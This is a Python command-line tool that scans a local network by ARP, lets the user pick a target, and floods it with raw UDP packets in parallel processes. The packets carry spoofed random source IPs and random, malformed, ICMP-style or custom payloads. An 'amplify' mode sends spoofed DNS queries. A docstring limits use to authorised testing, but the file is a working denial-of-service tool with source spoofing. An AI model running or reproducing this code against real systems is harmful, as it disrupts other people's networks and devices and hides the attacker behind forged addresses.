#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import argparse
import random
import string
import multiprocessing
import time
import socket
import struct
import sys
import os
from time import sleep
import scapy.all as scapy
from datetime import datetime
import curses

"""
WARNING:
---------
This tool sends UDP packets with various payloads (random, malformed, ICMP, custom, etc.).
Most modern devices and network stacks will NOT freeze or crash when receiving large, random, or malformed UDP packets.
Only poorly coded or vulnerable custom applications may crash, freeze, or behave unexpectedly if they do not handle UDP data safely.

- Standard operating systems (Windows, Linux, macOS, routers, etc.) are generally robust and will ignore or drop unexpected UDP data.
- Embedded, IoT, or legacy devices with weak software may be more likely to freeze or reboot if overwhelmed or if they have software bugs.
- Buffer overflows and device freezes are rare in modern, well-tested network stacks, but may occur in buggy custom applications.

Use this tool ONLY on systems you own or have explicit permission to test.
Unauthorized use is illegal and unethical.
"""

# --- Global State ---
networkDevices = []
arpRequest = None
etherBroadcast = None

def clearScreen():
    os.system('cls' if os.name == 'nt' else 'clear')

def printHeader():
    print("\tIP Address\t\tMAC Address\t\t\tVendor")
    print("---------------------------------------------------------------\n")

def scanDevices():
    global networkDevices, arpRequest, etherBroadcast
    if arpRequest is None or etherBroadcast is None:
        print("ARP/Ether not initialized. Please specify --network or --target.")
        sys.exit(1)
    responses = scapy.srp(etherBroadcast/arpRequest, timeout=0.5, verbose=False)[0]
    macVendors = []

    for resp in responses:
        if resp[-1].hwsrc not in [dev['MAC'] for dev in networkDevices]:
            networkDevices.append({'IP': resp[-1].psrc, 'MAC': resp[-1].hwsrc})

    try:
        with open('macs.txt', 'r', encoding="utf8") as macfile:
            for line in macfile:
                if len(line) > 3:
                    macVendors.append({'MAC': line[:9], 'Vendor': line[9:].rstrip("\n")})
    except FileNotFoundError:
        macVendors = []

    for idx, dev in enumerate(networkDevices):
        for macVendor in macVendors:
            if macVendor['MAC'][0:8].lower() == dev['MAC'][0:8].lower():
                networkDevices[idx]['Vendor'] = macVendor['Vendor']
                break
        if len(networkDevices[idx]) == 2:
            networkDevices[idx]['Vendor'] = 'Unknown'
    return networkDevices

def pickTargetCurses(devices):
    def drawMenu(stdscr, selectedIdx):
        stdscr.clear()
        stdscr.addstr(0, 0, "Select a device with arrow keys and press Enter:")
        for idx, dev in enumerate(devices):
            line = f"{idx+1}. {dev['IP']}  {dev['MAC']}  {dev['Vendor']}"
            if idx == selectedIdx:
                stdscr.addstr(idx+2, 0, line, curses.A_REVERSE)
            else:
                stdscr.addstr(idx+2, 0, line)
        stdscr.refresh()

    def menu(stdscr):
        curses.curs_set(0)
        selectedIdx = 0
        while True:
            drawMenu(stdscr, selectedIdx)
            key = stdscr.getch()
            if key in [curses.KEY_UP, ord('k')]:
                selectedIdx = (selectedIdx - 1) % len(devices)
            elif key in [curses.KEY_DOWN, ord('j')]:
                selectedIdx = (selectedIdx + 1) % len(devices)
            elif key in [curses.KEY_ENTER, ord('\n'), ord('\r')]:
                return devices[selectedIdx]['IP']

    return curses.wrapper(menu)

def generateAsciiPayload(size, asciiPayload=None):
    if asciiPayload:
        pattern = (asciiPayload * ((size // len(asciiPayload)) + 1))[:size]
    else:
        pattern = (string.ascii_uppercase * ((size // 26) + 1))[:size]
    return pattern.encode()

def generateHexadecimalPayload(hexStr, size):
    if not hexStr:
        raise ValueError("Hexadecimal format requires --format-hexa argument.")
    hexStr = hexStr.replace(" ", "")
    base = bytes.fromhex(hexStr)
    repeats = size // len(base)
    rem = size % len(base)
    return base * repeats + base[:rem]

def generateMalformedPayload(size):
    if size == 0:
        return b''
    half = size // 2
    malformed = bytes([0x00, 0xFF] * (half // 2))
    malformed += bytes(random.getrandbits(8) for _ in range(size - len(malformed)))
    if len(malformed) > size:
        malformed = malformed[:size-1]
    elif len(malformed) < size:
        malformed += b'\x00' * (size - len(malformed))
    return malformed

def generateCustomPayload(customPayload, size):
    if not customPayload:
        raise ValueError("Custom payload mode requires --format-ascii argument.")
    pattern = (customPayload * ((size // len(customPayload)) + 1))[:size]
    return pattern.encode()

def generateIcmpPayload(size):
    header = struct.pack('!BBHHH', 8, 0, 0, 0x1234, 1)
    data = bytes([0x42] * max(0, size - 8))
    pseudo = header + data
    s = 0
    for i in range(0, len(pseudo), 2):
        w = (pseudo[i] << 8) + (pseudo[i+1] if i+1 < len(pseudo) else 0)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    checksum = (~s) & 0xffff
    header = struct.pack('!BBHHH', 8, 0, checksum, 0x1234, 1)
    return header + data

def generatePayload(mode, size, incState=None, customPayload=None):
    if mode == "random":
        return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()
    elif mode == "zero":
        return bytes([0] * size)
    elif mode == "ff":
        return bytes([0xFF] * size)
    elif mode == "inc":
        if incState is None:
            incState = [0]
        payload = bytes([(incState[0] + i) % 256 for i in range(size)])
        incState[0] = (incState[0] + size) % 256
        return payload
    elif mode == "malformed":
        return generateMalformedPayload(size)
    elif mode == "custom":
        return generateCustomPayload(customPayload, size)
    elif mode == "icmp":
        return generateIcmpPayload(size)
    else:
        raise ValueError("Unknown payload mode.")

def generateSpoofIp():
    def isPrivate(parts):
        if parts[0] == 10 or parts[0] == 127:
            return True
        if parts[0] == 192 and parts[1] == 168:
            return True
        if parts[0] == 172 and 16 <= parts[1] <= 31:
            return True
        if 224 <= parts[0] <= 239:
            return True
        if parts == [255, 255, 255, 255]:
            return True
        return False

    while True:
        parts = [random.randint(1, 254) for _ in range(4)]
        if not isPrivate(parts):
            return ".".join(map(str, parts))

def calcChecksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    s = ~s & 0xffff
    return s

def buildIpHeader(src, dst, payloadLen):
    versionIhl = (4 << 4) + 5
    tos = 0
    totalLen = 20 + 8 + payloadLen
    ident = random.randint(0, 65535)
    flagsFrag = 0
    ttl = 64
    proto = socket.IPPROTO_UDP
    checksumIp = 0
    srcBytes = socket.inet_aton(src)
    dstBytes = socket.inet_aton(dst)

    ipHdr = struct.pack('!BBHHHBBH4s4s',
                         versionIhl, tos, totalLen, ident, flagsFrag,
                         ttl, proto, checksumIp, srcBytes, dstBytes)
    checksumIp = calcChecksum(ipHdr)
    ipHdr = struct.pack('!BBHHHBBH4s4s',
                         versionIhl, tos, totalLen, ident, flagsFrag,
                         ttl, proto, checksumIp, srcBytes, dstBytes)
    return ipHdr

def buildUdpHeader(srcPort, dstPort, payloadLen):
    length = 8 + payloadLen
    checksumUdp = 0
    return struct.pack('!HHHH', srcPort, dstPort, length, checksumUdp)

def buildDnsQuery(domain="example.com"):
    transactionId = random.randint(0, 65535)
    flags = 0x0100
    questions = 1
    answerRrs = 0
    authorityRrs = 0
    additionalRrs = 0
    header = struct.pack(">HHHHHH", transactionId, flags, questions, answerRrs, authorityRrs, additionalRrs)
    qname = b''.join((bytes([len(part)]) + part.encode() for part in domain.split('.'))) + b'\x00'
    qtype = 1
    qclass = 1
    question = qname + struct.pack(">HH", qtype, qclass)
    return header + question

def parseChannels(channelsStr):
    if not channelsStr:
        return []
    try:
        return [int(ch.strip()) for ch in channelsStr.split(",") if ch.strip().isdigit()]
    except Exception:
        print("Invalid channel list format.")
        return []

def udpWorker(targetIp, targetPort, payloadSize, packetCount, interval, resultQueue,
               payloadMode, formatAscii, formatHexa, channels, incState):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print("Root privileges required.")
        sys.exit(1)

    sent = 0
    channelIdx = 0
    channelCount = len(channels)
    try:
        while packetCount == 0 or sent < packetCount:
            srcIp = generateSpoofIp()
            srcPort = random.randint(1024, 65535)
            if channelCount > 0:
                dstPort = channels[channelIdx % channelCount]
                channelIdx += 1
            else:
                dstPort = targetPort

            if formatAscii is not None:
                payload = generateAsciiPayload(payloadSize, formatAscii)
            elif formatHexa is not None:
                payload = generateHexadecimalPayload(formatHexa, payloadSize)
            else:
                payload = generatePayload(payloadMode, payloadSize, incState, formatAscii if payloadMode == "custom" else None)

            ipHdr = buildIpHeader(srcIp, targetIp, payloadSize)
            udpHdr = buildUdpHeader(srcPort, dstPort, payloadSize)
            packet = ipHdr + udpHdr + payload

            try:
                sock.sendto(packet, (targetIp, 0))
                sent += 1
            except Exception:
                pass
    except KeyboardInterrupt:
        pass

    resultQueue.put(sent)

def amplifyWorker(targetIp, targetPort, sizeFunc, packetCount, interval, resultQueue,
                   payloadMode, formatAscii, formatHexa, incState, dnsDomain=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print("Root privileges required.")
        sys.exit(1)

    sent = 0
    try:
        while packetCount == 0 or sent < packetCount:
            srcIp = generateSpoofIp()
            srcPort = random.randint(1024, 65535)
            payloadSize = sizeFunc()
            # Always use DNS payload if dnsDomain is set
            if dnsDomain:
                payload = buildDnsQuery(dnsDomain)
            elif formatAscii is not None:
                payload = generateAsciiPayload(payloadSize, formatAscii)
            elif formatHexa is not None:
                payload = generateHexadecimalPayload(formatHexa, payloadSize)
            elif payloadMode == "custom":
                payload = generateCustomPayload(formatAscii, payloadSize)
            elif payloadMode == "icmp":
                payload = generateIcmpPayload(payloadSize)
            elif payloadMode in ["random", "zero", "ff", "inc", "malformed"]:
                payload = generatePayload(payloadMode, payloadSize, incState)
            else:
                payload = buildDnsQuery("example.com")
            ipHdr = buildIpHeader(srcIp, targetIp, len(payload))
            udpHdr = buildUdpHeader(srcPort, targetPort, len(payload))
            packet = ipHdr + udpHdr + payload
            try:
                sock.sendto(packet, (targetIp, 0))
                sent += 1
            except Exception:
                pass
            if interval > 0:
                time.sleep(interval)
    except KeyboardInterrupt:
        pass
    resultQueue.put(sent)

def amplifyFlood(targets, port, sizeFunc, count, processes, interval,
                  payloadMode, formatAscii, formatHexa, dnsDomain=None):
    print(f"Launching UDP amplify on {len(targets)} hosts, port {port}, {processes} processes each.")
    print(f"Payload mode: {payloadMode}")
    if formatAscii is not None:
        print("Payload format: ascii")
    elif formatHexa is not None:
        print("Payload format: hexa")
    if dnsDomain:
        print(f"DNS query domain: {dnsDomain}")
    resultQueue = multiprocessing.Queue()
    procList = []
    incStates = [[0] for _ in range(len(targets) * processes)]
    for idx, ip in enumerate(targets):
        for pidx in range(processes):
            incState = incStates[idx * processes + pidx]
            p = multiprocessing.Process(
                target=amplifyWorker,
                args=(ip, port, sizeFunc, count, interval, resultQueue,
                      payloadMode, formatAscii, formatHexa, incState, dnsDomain)
            )
            p.start()
            procList.append(p)
    totalSent = 0
    start = time.time()
    try:
        while any(p.is_alive() for p in procList):
            time.sleep(1)
            while not resultQueue.empty():
                totalSent += resultQueue.get()
            print(f"\rPackets sent: {totalSent}", end='', flush=True)
    except KeyboardInterrupt:
        print("\nAmplify interrupted.")
    for p in procList:
        p.terminate()
        p.join()
    while not resultQueue.empty():
        totalSent += resultQueue.get()
    duration = time.time() - start
    print(f"\nAmplify complete. Sent {totalSent} packets in {duration:.2f} seconds.")

def udpFlood(targets, port, size, count, processes, interval,
              payloadMode, formatAscii, formatHexa, channels):
    print(f"Launching UDP flood on {len(targets)} hosts, port {port}, {processes} processes each.")
    print(f"Payload mode: {payloadMode}")
    if formatAscii is not None:
        print("Payload format: ascii")
    elif formatHexa is not None:
        print("Payload format: hexa")
    if channels:
        print(f"Channel hopping enabled: {channels}")
    resultQueue = multiprocessing.Queue()
    procList = []
    incStates = [[0] for _ in range(len(targets) * processes)]

    for idx, ip in enumerate(targets):
        for pidx in range(processes):
            incState = incStates[idx * processes + pidx]
            p = multiprocessing.Process(
                target=udpWorker,
                args=(ip, port, size, count, interval, resultQueue,
                      payloadMode, formatAscii, formatHexa, channels, incState)
            )
            p.start()
            procList.append(p)

    totalSent = 0
    start = time.time()

    try:
        while any(p.is_alive() for p in procList):
            time.sleep(1)
            while not resultQueue.empty():
                totalSent += resultQueue.get()
            print(f"\rPackets sent: {totalSent}", end='', flush=True)
    except KeyboardInterrupt:
        print("\nFlood interrupted.")

    for p in procList:
        p.terminate()
        p.join()

    while not resultQueue.empty():
        totalSent += resultQueue.get()

    duration = time.time() - start
    print(f"\nFlood complete. Sent {totalSent} packets in {duration:.2f} seconds.")

def main():
    global networkDevices, arpRequest, etherBroadcast
    targets = []

    parser = argparse.ArgumentParser(description="UDP utils with payloads")
    parser.add_argument("-m", "--mode", choices=["flood", "amplify", "random"], default="flood", help="Flood mode")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Parallel process count")
    parser.add_argument("-i", "--interface", help="Network interface (unused)")
    parser.add_argument("-n", "--network", help="Network/subnet to scan (e.g., 192.168.1.1/24)")
    parser.add_argument("-T", "--target", help="Specific target IP address")
    parser.add_argument("-p", "--port", type=int, default=53, help="UDP port")
    parser.add_argument("-s", "--size", type=str, default="128", help="Payload size (bytes) or 'auto' for random 1-1450")
    parser.add_argument("-c", "--count", type=int, default=0, help="Packets per process (0=infinite)")
    parser.add_argument("-v", "--interval", type=float, default=0, help="Interval between packets (seconds)")

    formatGroup = parser.add_mutually_exclusive_group()
    formatGroup.add_argument("--format-ascii", type=str, metavar="STRING", help="Use ASCII payload format with the given string")
    formatGroup.add_argument("--format-hexa", type=str, metavar="HEX", help="Use hexadecimal payload format with the given hex string")

    parser.add_argument(
        "--payload-mode",
        choices=["random", "zero", "ff", "inc", "malformed", "custom", "icmp"],
        default=None,
        help="Payload pattern"
    )
    parser.add_argument("--channels", help="Comma-separated channel list for hopping (e.g., 1,6,11)")
    parser.add_argument("--dns", type=str, help="Domain for DNS query payload (amplify mode only)")

    args = parser.parse_args()

    if args.dns and args.mode != "amplify":
        print("Error: --dns can only be used with --mode amplify.")
        sys.exit(1)

    if args.payload_mode != "custom" and (args.format_ascii is not None or args.format_hexa is not None):
        print("Error: --format-ascii and --format-hexa can only be used with --payload-mode custom.")
        sys.exit(1)

    if args.format_ascii is not None:
        asciiStr = args.format_ascii.strip()
        hexLike = all(
            all(c in "0123456789abcdefABCDEF" for c in part)
            and len(part) == 2
            for part in asciiStr.split()
        )
        if hexLike and len(asciiStr.replace(" ", "")) % 2 == 0:
            print("Error: --format-ascii should not be a hexadecimal string. Use --format-hexa for hex payloads.")
            sys.exit(1)
    if args.format_hexa is not None:
        hexaStr = args.format_hexa.strip().replace(" ", "")
        if len(hexaStr) == 0 or len(hexaStr) % 2 != 0 or not all(c in "0123456789abcdefABCDEF" for c in hexaStr):
            print("Error: --format-hexa must be a valid hexadecimal string (e.g., 'AA BB CC' or 'aabbcc').")
            sys.exit(1)

    if args.size == "auto":
        def autoSize():
            return random.randint(1, 1450)
        sizeFunc = autoSize
    else:
        try:
            sizeVal = int(args.size)
            def sizeFunc():
                return sizeVal
        except ValueError:
            print("Invalid size value.")
            sys.exit(1)

    if args.target:
        targets = [args.target]
        arpRequest = scapy.ARP(pdst=args.target)
        etherBroadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    elif args.network:
        arpRequest = scapy.ARP(pdst=args.network)
        etherBroadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

        print(f"Scanning network: {args.network}")
        networkDevices = []

        networkDevices = scanDevices()
        if not networkDevices:
            print("No devices found.")
            sys.exit(0)

        print("Devices found:")
        for d in networkDevices:
            print(f"{d['IP']}\t\t{d['MAC']}\t\t{d['Vendor']}")
        selectedIp = pickTargetCurses(networkDevices)
        targets = [selectedIp]
    else:
        ip = input("Enter a specific target IP address: ").strip()
        try:
            socket.inet_aton(ip)
            targets = [ip]
            arpRequest = scapy.ARP(pdst=ip)
            etherBroadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        except socket.error:
            print("Invalid IP address.")
            sys.exit(1)

    if not targets:
        print("No targets found.")
        sys.exit(1)

    channels = parseChannels(args.channels)

    if args.mode == "amplify":
        amplifyFlood(
            targets=targets,
            port=args.port,
            sizeFunc=sizeFunc,
            count=args.count,
            processes=args.threads,
            interval=args.interval,
            payloadMode=args.payload_mode,
            formatAscii=args.format_ascii,
            formatHexa=args.format_hexa,
            dnsDomain=args.dns
        )
        return

    def udpFloodAuto(targets, port, sizeFunc, count, processes, interval,
                       payloadMode, formatAscii, formatHexa, channels):
        print(f"Launching UDP flood on {len(targets)} hosts, port {port}, {processes} processes each.")
        print(f"Payload mode: {payloadMode}")
        if formatAscii is not None:
            print("Payload format: ascii")
        elif formatHexa is not None:
            print("Payload format: hexa")
        if channels:
            print(f"Channel hopping enabled: {channels}")
        resultQueue = multiprocessing.Queue()
        procList = []
        incStates = [[0] for _ in range(len(targets) * processes)]

        def udpWorkerAuto(targetIp, targetPort, count, interval, resultQueue,
                            payloadMode, formatAscii, formatHexa, channels, incState):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            except PermissionError:
                print("Root privileges required.")
                sys.exit(1)

            sent = 0
            channelIdx = 0
            channelCount = len(channels)
            try:
                while count == 0 or sent < count:
                    payloadSize = sizeFunc()
                    srcIp = generateSpoofIp()
                    srcPort = random.randint(1024, 65535)
                    if channelCount > 0:
                        dstPort = channels[channelIdx % channelCount]
                        channelIdx += 1
                    else:
                        dstPort = targetPort

                    if formatAscii is not None:
                        payload = generateAsciiPayload(payloadSize, formatAscii)
                    elif formatHexa is not None:
                        payload = generateHexadecimalPayload(formatHexa, payloadSize)
                    elif payloadMode == "icmp":
                        payload = generateIcmpPayload(payloadSize)
                    else:
                        payload = generatePayload(payloadMode, payloadSize, incState, formatAscii if payloadMode == "custom" else None)

                    ipHdr = buildIpHeader(srcIp, targetIp, payloadSize)
                    udpHdr = buildUdpHeader(srcPort, dstPort, payloadSize)
                    packet = ipHdr + udpHdr + payload

                    try:
                        sock.sendto(packet, (targetIp, 0))
                        sent += 1
                    except Exception:
                        pass
            except KeyboardInterrupt:
                pass

            resultQueue.put(sent)

        for idx, ip in enumerate(targets):
            for pidx in range(processes):
                incState = incStates[idx * processes + pidx]
                p = multiprocessing.Process(
                    target=udpWorkerAuto,
                    args=(ip, port, count, interval, resultQueue,
                          payloadMode, formatAscii, formatHexa, channels, incState)
                )
                p.start()
                procList.append(p)

        totalSent = 0
        start = time.time()

        try:
            while any(p.is_alive() for p in procList):
                time.sleep(1)
                while not resultQueue.empty():
                    totalSent += resultQueue.get()
                print(f"\rPackets sent: {totalSent}", end='', flush=True)
        except KeyboardInterrupt:
            print("\nFlood interrupted.")

        for p in procList:
            p.terminate()
            p.join()

        while not resultQueue.empty():
            totalSent += resultQueue.get()

        duration = time.time() - start
        print(f"\nFlood complete. Sent {totalSent} packets in {duration:.2f} seconds.")

    if args.size == "auto":
        udpFloodAuto(
            targets=targets,
            port=args.port,
            sizeFunc=sizeFunc,
            count=args.count,
            processes=args.threads,
            interval=args.interval,
            payloadMode=args.payload_mode,
            formatAscii=args.format_ascii,
            formatHexa=args.format_hexa,
            channels=channels
        )
    else:
        udpFlood(
            targets=targets,
            port=args.port,
            size=sizeFunc(),
            count=args.count,
            processes=args.threads,
            interval=args.interval,
            payloadMode=args.payload_mode,
            formatAscii=args.format_ascii,
            formatHexa=args.format_hexa,
            channels=channels
        )

if __name__ == "__main__":
    main()